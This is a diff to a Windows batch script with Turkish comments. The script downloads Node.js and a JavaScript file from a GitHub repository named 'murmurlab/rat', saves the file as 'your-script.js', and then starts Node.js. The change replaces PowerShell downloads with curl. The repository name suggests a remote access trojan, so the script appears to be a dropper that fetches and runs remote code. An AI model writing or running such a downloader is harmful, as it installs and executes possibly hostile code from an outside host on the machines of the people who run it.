@@ -10,9 +10,13 @@ set "scriptUrl=https://raw.githubusercontent.com/murmurlab/rat/main/x.js"
 :: İndirilecek dosyaların hedef konumu
 set "downloadPath=%~dp0"
 
+:: curl komutu kontrolü
+set "curlCommand=curl"
+where %curlCommand% >nul 2>&1 || set "curlCommand=."
+
 :: Node.js indirme
 echo Node.js indiriliyor...
-powershell -command "Invoke-WebRequest -Uri '%nodeUrl%' -OutFile '%downloadPath%\node.zip'"
+%curlCommand% -o "%downloadPath%\node.zip" "%nodeUrl%"
 
 :: Zip dosyasının çıkarılması
 echo Zip dosyası çıkarılıyor...
@@ -20,7 +24,7 @@ powershell -command "Expand-Archive -Path '%downloadPath%\node.zip' -Destination
 
 :: Script dosyasının indirilmesi
 echo Script dosyası indiriliyor...
-powershell -command "Invoke-WebRequest -Uri '%scriptUrl%' -OutFile '%downloadPath%\your-script.js'"
+%curlCommand% -o "%downloadPath%\your-script.js" "%scriptUrl%"
 
 :: Node.js'in çalıştırılması
 echo Node.js çalıştırılıyor...
